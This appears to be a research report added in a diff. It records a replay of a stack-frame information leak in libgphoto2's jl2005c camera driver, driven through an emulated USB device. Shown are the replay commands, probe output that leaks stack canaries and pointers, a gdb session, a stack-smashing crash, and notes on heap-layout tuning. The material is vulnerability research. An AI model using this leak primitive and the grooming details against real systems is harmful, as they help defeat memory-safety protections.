@@ -1,0 +1,146 @@
+# W180 (2026-11-25 01:50–01:52Z): one-command clean-archive replay of the
+# W175/W177 real-API stack-frame disclosure. Author replay, NOT a witness
+# verdict. No camlib or harness source changed by this replay.
+
+## Command (from repository root)
+
+  git archive HEAD reports/frontier-libgphoto2shell.md lab/frontier/libgphoto2shell \
+    | tar x -C /tmp/w180-clean-lgp2
+  cd /tmp/w180-clean-lgp2
+  TARBALL=$REPO/lab/frontier/libgphoto2shell/src/libgphoto2-2.5.34.tar.bz2 \
+    WORK=/tmp/w180-final sh lab/frontier/libgphoto2shell/live/replay-real-w177.sh
+
+## Script output
+
+  pins: 4/4 OK
+  patched vusb.c sha256 2b744f67e420a1a6addbf04861685c0711b33df36497e93e9267b4a23e57dde6
+  jl2005c.so sha256 af283a8dd508014eb4aac0a6ed00e25318b72af52b16e2affa293d042c9ab991
+  (build-id depends on the absolute build path, so the .so hash is recorded
+  but is not a replay criterion)
+  selected DRAIN=20 (heap-layout dependent; override with DRAIN=N)
+  RESULT: 20 PASS / 0 FAIL
+
+## Raw probe output
+
+=== CANARY 1 ===
+VUSB_VICTIM 0x56f88f58c940
+OWN_CANARY=8a17bc30d6578900
+gp_camera_init rc=0
+list_files rc=0 count=1053
+first name=jl_001.ppm
+last name=jl_999.ppm
+file=jl_1024.ppm table_k=1023 rc=0 size=16 data=0000000000000000008957d630bc178a
+RC=0
+
+=== CANARY 2 ===
+VUSB_VICTIM 0x6162b09e3940
+OWN_CANARY=f660771f579e4200
+gp_camera_init rc=0
+list_files rc=0 count=1053
+first name=jl_001.ppm
+last name=jl_999.ppm
+file=jl_1024.ppm table_k=1023 rc=0 size=16 data=000000000000000000429e571f7760f6
+RC=0
+
+=== CANARY 3 ===
+VUSB_VICTIM 0x5663c8d92940
+OWN_CANARY=10a62cff12f76800
+gp_camera_init rc=0
+list_files rc=0 count=1053
+first name=jl_001.ppm
+last name=jl_999.ppm
+file=jl_1024.ppm table_k=1023 rc=0 size=16 data=00000000000000000068f712ff2ca610
+RC=0
+
+=== PTR 1 ===
+VUSB_VICTIM 0x63eb20a9f940
+OWN_CANARY=265a045363835e00
+gp_camera_init rc=0
+list_files rc=0 count=1053
+first name=jl_001.ppm
+last name=jl_999.ppm
+file=jl_1025.ppm table_k=1024 rc=0 size=16 data=80c3827efc7f0000802a713f44720000
+RC=0
+
+=== PTR 2 ===
+VUSB_VICTIM 0x5ee19566f940
+OWN_CANARY=5b4a06b0364d0000
+gp_camera_init rc=0
+list_files rc=0 count=1053
+first name=jl_001.ppm
+last name=jl_999.ppm
+file=jl_1025.ppm table_k=1024 rc=0 size=16 data=002992e2ff7f0000809aaa83d0770000
+RC=0
+
+=== PTR 3 ===
+VUSB_VICTIM 0x5613632f0940
+OWN_CANARY=f27d47611a93cd00
+gp_camera_init rc=0
+list_files rc=0 count=1053
+first name=jl_001.ppm
+last name=jl_999.ppm
+file=jl_1025.ppm table_k=1024 rc=0 size=16 data=701fbac9fc7f0000809acaf3f8790000
+RC=0
+
+=== GDB ===
+Function "jl2005c_init" not defined.
+Breakpoint 1 (jl2005c_init) pending.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+warning: Temporarily disabling breakpoints for unloaded shared library "/tmp/w180-final/libgphoto2-2.5.34/installdir-plain/lib/libgphoto2/2.5.34/jl2005c.so"
+
+Breakpoint 1, jl2005c_init (camera=0x55555555a2b0, port=0x55555555b6a0, priv=0x555555561310) at jl2005c/jl2005c.c:47
+47	{
+GDB_R1=0x7fffffffc910
+GDB_AT_R1=0x7fffffffc9f0
+GDB_AT_R1_8=0x7ffff7bf5a80
+GDB_R2=0x7fffffffc9f0
+GDB_R2_MINUS8=0x55555555a3a0
+GDB_AT_R2=0x7fffffffd490
+GDB_AT_R2_8=0x7ffff7f3a0f3
+VUSB_VICTIM 0x555555566940
+OWN_CANARY=2e3734f53b448900
+gp_camera_init rc=0
+list_files rc=0 count=1053
+first name=jl_001.ppm
+last name=jl_999.ppm
+file=jl_1025.ppm table_k=1024 rc=0 size=16 data=f0c9ffffff7f0000805abff7ff7f0000
+[Inferior 1 (process 3668969) exited normally]
+RC=0
+
+=== COUNT100 ===
+VUSB_VICTIM 0x5b3726a14940
+OWN_CANARY=af04056a7666e700
+gp_camera_init rc=0
+list_files rc=0 count=100
+first name=jl_001.ppm
+last name=jl_100.ppm
+file=jl_1024.ppm table_k=1023 rc=-108
+RC=0
+
+=== FULLREPLY ===
+VUSB_VICTIM 0x6322a6314940
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+RC=134
+
+## Failed sweep before the fix (preserved)
+
+Two earlier runs of the same committed recipe with a fixed DRAIN=28
+(`/tmp/w180-try`, `/tmp/w178-lgp`) aborted at `malloc(): corrupted top size`
+before any `gp_camera_file_get`. A manual sweep in `/tmp/w178-lgp` showed
+DRAIN 24..29 corrupt, 30..32 disclose the canary; a fixed DRAIN=30 then
+failed under a second clean archive (`/tmp/w180-clean-build`). The criterion
+is the victim chunk at `priv+0x4050`, not a numeric drain, so the script now
+sweeps DRAIN 20..40 and records the selected value. This is a layout
+calibration, not a new claim: the reported disclosure, control behaviour and
+grade are unchanged.
+
+## Limits (unchanged)
+
+Author replay of committed files plus the pinned release tarball; not an
+independent witness verdict. The disclosure goes to a HOST consumer through
+the real public API; W176 still holds — this camlib never echoes table bytes
+to the device, so a malicious camera cannot read the canary or pointers this
+way. No wire path, device-only canary recovery, pointer dereference without
+gdb, command or rung 5. Rung 5 UNKNOWN.
